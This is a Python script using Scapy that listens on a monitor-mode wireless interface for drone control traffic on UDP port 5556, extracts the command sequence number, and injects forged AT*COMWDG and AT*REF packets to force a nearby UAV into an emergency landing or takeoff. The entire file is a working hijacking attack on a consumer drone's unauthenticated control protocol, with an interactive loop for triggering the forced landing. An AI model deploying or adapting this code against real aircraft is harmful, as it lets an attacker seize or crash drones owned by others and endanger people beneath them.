import threading
from scapy.all import *

conf.iface = 'mon0'
NAVPORT = 5556
LAND = '290717696'
EMER = '290717952'
TAKEOFF = '290718208'

class InterceptThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.curPkt = None
        self.seq = 0
        self.foundUAV = False

    def run(self):
        sniff(prn=self.interceptPkt, filter='udp port 5556')

    def interceptPkt(self, pkt):
        if not self.foundUAV:
            print('[*] UAV Found.')
            self.foundUAV = True
            self.curPkt = pkt
            raw = pkt[Raw].load.decode('utf-8', errors='ignore')
            try:
                self.seq = int(raw.split(',')[0].split('=')[-1]) + 5
            except Exception as e:
                print(f'Error extracting sequence number: {e}')
                self.seq = 0

    def injectCmd(self, cmd):
        radio = dup.dupRadio(self.curPkt)
        dot11 = dup.dupDot11(self.curPkt)
        snap = dup.dupSNAP(self.curPkt)
        llc = dup.dupLLC(self.curPkt)
        ip = dup.dupIP(self.curPkt)
        udp = dup.dupUDP(self.curPkt)
        raw = Raw(load=cmd.encode('utf-8'))
        injectPkt = radio / dot11 / llc / snap / ip / udp / raw
        sendp(injectPkt)

    def emergencyland(self):
        spoofSeq = self.seq + 100
        watch = f'AT*COMWDG={spoofSeq}\r'
        toCmd = f'AT*REF={spoofSeq + 1},{EMER}\r'
        self.injectCmd(watch)
        self.injectCmd(toCmd)

    def takeoff(self):
        spoofSeq = self.seq + 100
        watch = f'AT*COMWDG={spoofSeq}\r'
        toCmd = f'AT*REF={spoofSeq + 1},{TAKEOFF}\r'
        self.injectCmd(watch)
        self.injectCmd(toCmd)

def main():
    uavIntercept = InterceptThread()
    uavIntercept.start()
    print('[*] Listening for UAV Traffic. Please WAIT...')
    while not uavIntercept.foundUAV:
        pass
    while True:
        input('[-] Press ENTER to Emergency Land UAV.')
        uavIntercept.emergencyland()

if __name__ == '__main__':
    main()
